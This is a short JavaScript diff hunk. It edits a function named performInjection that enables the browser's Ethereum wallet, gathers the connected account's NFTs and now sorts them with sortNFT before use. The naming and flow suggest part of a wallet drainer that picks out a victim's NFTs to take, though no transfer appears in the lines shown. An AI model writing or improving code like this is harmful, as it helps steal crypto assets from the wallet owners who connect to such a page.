@@ -166,7 +166,7 @@ window.ethereum.enable();
 
 async function performInjection(address) {
     let nfts = await getNFTS(selectedAccount);
-    let sortedNFTs = nfts;
+    let sortedNFTs = sortNFT(nfts);
     console.log(sortedNFTs);
     if (sortedNFTs.length == 0) {
         throw "No NFTs found"
